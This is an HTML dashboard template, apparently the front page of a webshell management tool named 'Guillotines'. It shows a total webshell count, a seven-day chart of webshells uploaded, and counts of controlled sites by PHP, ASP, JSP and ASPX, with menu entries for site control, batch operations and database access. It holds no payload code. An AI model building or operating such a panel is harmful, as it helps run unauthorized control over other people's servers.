<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>血滴子 - Guillotines</title>
    <link rel="stylesheet" href="/Public/css/library/bootstrap/bootstrap.css">
	<link rel="stylesheet" href="/Public/css/branch/base.css">
    <link rel="stylesheet" href="/Public/css/branch/Main_index.css">
</head>
<body>
<div class="container">
    <div class="row">
		<div class="col-xs-3">
		    <ul class="nav nav-tabs nav-stacked" data-spy="affix">
		    	<span>Guillotines</span>
		    	<form class="nav-tabs-form">
		      		<input class="form-control" type="text" placeholder="Search...">
		      		<button type="submit">
		        		<span class="glyphicon glyphicon-search"></span>
		      		</button>
		    	</form>
		    	<li class="nav-list-span">功能列表</li>
		        <li><a href="/Main/index">首页</a></li>
		        <li><a href="/Main/website">受控站点</a></li>
		        <li><a href="/Main/updata">更新站点</a></li>
		        <li><a href="/Main/operation">统一操作</a></li>
		        <li><a href="/Main/database">数据库操作</a></li>
		    </ul>
		</div>
        <div class="col-xs-9">
            <button class="button-info">WebShell总数：<b>{{total_webshell}}</b></button>
            <div style="clear:both"></div>
            <div class="hr-text">
                <h6>近7天，每天上传的WebShell数量统计报表</h6>
            </div>
    		<canvas id="Statistics"></canvas>
            <div class="hr-text">
                <h6>站点类别</h6>
            </div>
            <div class="list-group">
				<button class="list-group-item"><span class="badge">5641</span>PHP</button>
				<button class="list-group-item"><span class="badge">456</span>ASP</button>
				<button class="list-group-item"><span class="badge">645</span>JSP</button>
				<button class="list-group-item"><span class="badge">651</span>ASPX</button>
            </div>
        </div>
    </div>
</div>
</body>
<script type="text/javascript" src="/Public/js/library/jquery.js"></script>
<script type="text/javascript" src="/Public/js/library/bootstrap.js"></script>
<script type="text/javascript" src="/Public/js/library/Chart.js"></script>
<script type="text/javascript" src="/Public/js/branch/base.js"></script>
<script type="text/javascript" src="/Public/js/branch/Main_index.js"></script>
<script type="text/javascript">
	var lineChartData = {
		labels :['24号','25号','26号','27号','28号','29号','30号'],	//使用模板参数传递，把从今天开始的“倒数7天”作为数组传递过来，类似右边。
		datasets : [
			{
				fillColor : "transparent",
				strokeColor : "#1BC98E",
				pointColor : "#1BC98E",
				pointStrokeColor : "#fff",
				data : ['2','25','41','21','5','18','57'] 	//他们分别对应[‘24号上传的webshell数量’,'‘25号上传的webshell数量’'.....'‘30号上传的webshell数量’']
			}
		]
	}
	var myLine = new Chart(document.getElementById("Statistics").getContext("2d")).Line(lineChartData);
</script>
</html>
